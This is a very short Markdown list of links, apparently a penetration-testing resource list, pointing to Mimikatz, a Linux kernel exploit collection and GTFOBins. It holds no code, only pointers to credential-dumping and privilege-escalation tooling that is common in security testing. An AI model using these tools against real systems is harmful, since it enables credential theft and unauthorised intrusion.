[Mimikatz](https://github.com/gentilkiwi/mimikatz)

[linux-kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits)

[GTFObins](https://gtfobins.github.io/)
